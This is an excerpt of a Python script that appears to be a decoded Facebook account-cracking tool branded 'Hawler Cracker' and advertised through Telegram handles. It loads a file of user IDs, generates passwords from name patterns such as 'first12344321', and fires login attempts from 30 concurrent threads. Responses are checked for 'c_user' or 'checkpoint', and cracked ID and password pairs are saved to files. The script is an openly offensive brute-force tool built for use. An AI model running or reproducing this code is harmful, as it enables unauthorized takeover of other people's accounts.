...
date = '12/4/2023, 24:00:00'
# if date <= kat:
    # print("   toolaka ragerawa ")
    # print("   bo kren @i4m_hawler")
    # exit()

try:
	import os,requests,json,time,re,random,sys
	from concurrent.futures import ThreadPoolExecutor as tred #• DeCoDe By @H_S_W_M •
...
os.system('espeak -a 300 " Welcome,   to,  Hawler,  Cracker,  Tools"')
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, ugen2, ugen, ugen5, redmi = [], [], [], [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0
print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
os.system("i4m_hawler")
print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝑊𝐸𝐿𝐶𝑂𝑀𝐸 𝐹𝑂𝑅 𝑇𝑂𝑂𝐿 𝐻𝐴𝑊𝐿𝐸𝑅")
time.sleep(2)
print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
logo=("""\x1b[38;5;196m  \033[37;1m  \033[38;5;46m     
• DeCoDe By @H_S_W_M •
\033[38;5;46m  [💸]\x1b[38;5;196m𝑂𝑊𝑁𝐸𝑅        \033[37;1m      \033[38;5;46m║\033[38;5;46m𝙆 𝙃𝘼𝙒𝙇𝙀𝙍             
\033[38;5;46m  [💸]\x1b[38;5;196m𝑇𝐸𝐿𝐸𝐺𝑅𝐴𝑀     \033[37;1m  \033[38;5;46m    ║\033[38;5;46m@i4m_hawler     
\033[38;5;46m  [💸]\x1b[38;5;196m𝐺𝐼𝑇𝐻𝑈𝐵       \033[37;1m  \033[38;5;46m    ║\033[38;5;46m𝑂𝑁𝐿𝑌 𝑀𝐸    
\033[38;5;46m  [💸]\x1b[38;5;196m𝐽𝑈𝑆𝑇          \033[37;1m  \033[38;5;46m   ║\033[38;5;46m𝐸𝑅𝐵𝐼𝐿    
\033[38;5;46m  [💸]\x1b[38;5;196m𝑇𝑂𝑂𝐿         \033[37;1m  \033[38;5;46m    ║\033[38;5;46m𝑉𝐼𝑃     
\033[38;5;46m  [💸]\x1b[38;5;196m𝐹𝑅𝑂𝑀         \033[37;1m \033[38;5;46m     ║\033[38;5;46m𝑇𝐴𝑌𝑅𝐴𝑊𝐴😂        
• DeCoDe By @H_S_W_M •
\x1b[38;5;196m  \033[37;1m  \033[38;5;46m     \033[00m\033[1;30m """)
def ikb():   
    os.system('clear')
    print(logo)
    print('\x1b[1;97m[\x1b[1;92m🟧\x1b[1;97m] 𝑆𝑇𝐴𝑇𝑈𝑆   : \x1b[1;92m＄＄\x1b[1;97m');time.sleep(0.03) #• DeCoDe By hossam •
    print(42*'-')
    print('\x1b[1;96m[ 1 ] \x1b[1;97m𝐶𝑟𝑎𝑐𝑘 𝑊𝑖𝑡ℎ 𝐹𝑖𝑙𝑒  \x1b[1;92m[𝑉𝐼𝑃]')
    print(42*'-')
    
    _ikb___ = input('\x1b[1;96m[=\x1b[1;96m]\x1b[1;97m 𝐶𝐻𝑂𝑂𝑆𝐸 : \x1b[1;92m')
    if _ikb___ in ('1', '01'):
        file()
    if _ikb___ in ('?', '0?'):
    	mysocial()
...
os.system(f'xdg-open https://t.me/I4MxCRACKERS') 
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
...
def file():
				clear()
				print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
				print(' \x1b[1;94mExample ➔ : ‌\x1b[1;92m/sdcard/hawler.txt ')
				linex()
				...
				plist = []
				print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
				print('  Telegram ➔ @ i4m_hawler ');linex();print(' \x1b[1;94m[ 1 ] \x1b[1;92mCrack Auto Password \n \x1b[1;94m[ 2 ] \x1b[1;97mCrack Choice Password');linex()
				ppp=input(' Choose: ')
				if ppp in ['1','01']:
					...
					plist.append('first12344321')
					plist.append('first1234554321')									
					...
					plist.append('123first123')
					plist.append('1234first1234')
					plist.append('12345first12345')
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
					print("""\x1b[38;5;196m  \033[37;1m  \033[38;5;46m     
\033[38;5;46m  [💸]\x1b[38;5;196m𝑂𝑊𝑁𝐸𝑅        \033[37;1m      \033[38;5;46m║\033[38;5;46m𝙆 𝙃𝘼𝙒𝙇𝙀𝙍             
\033[38;5;46m  [💸]\x1b[38;5;196m𝑇𝐸𝐿𝐸𝐺𝑅𝐴𝑀     \033[37;1m  \033[38;5;46m    ║\033[38;5;46m@i4m_hawler     
\033[38;5;46m  [💸]\x1b[38;5;196m𝐺𝐼𝑇𝐻𝑈𝐵       \033[37;1m  \033[38;5;46m    ║\033[38;5;46m𝑂𝑁𝐿𝑌 𝑀𝐸    
\033[38;5;46m  [💸]\x1b[38;5;196m𝐽𝑈𝑆𝑇          \033[37;1m  \033[38;5;46m   ║\033[38;5;46m𝐸𝑅𝐵𝐼𝐿    
...
\x1b[38;5;196m  \033[37;1m  \033[38;5;46m     \033[00m\033[1;30m """)					
					print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
					print(' \033[    𝑇𝑜𝑡𝑎𝑙 𝐼𝐷 𝑌𝑜𝑢𝑟 𝐹𝑖𝑙𝑒 \033[1;37m➟ \033[1;32m'+total_ids+f' ')
					linex()
					for user in fo:
...
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;32m [ 𝐾 𝐻𝐴𝑊𝐿𝐸𝑅 ] %s|\033[1;32m𝑂𝐾:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [𝐻𝐴𝑊𝐿𝐸𝑅-𝑂𝐾] %s | %s'%(ids,pas))
                                os.system('espeak -a 300 " HAWLER,   CRACKER,  HAWLER,   OK"')
                                open(f'/sdcard/𝐻𝐴𝑊𝐿𝐸𝑅-𝑂𝐾.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[   [𝐻𝐴𝑊𝐿𝐸𝑅-𝐶𝑝] '+ids+' | '+pas+'')
                                        open(f'/sdcard/𝐻𝐴𝑊𝐿𝐸𝑅-𝐶𝑝.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
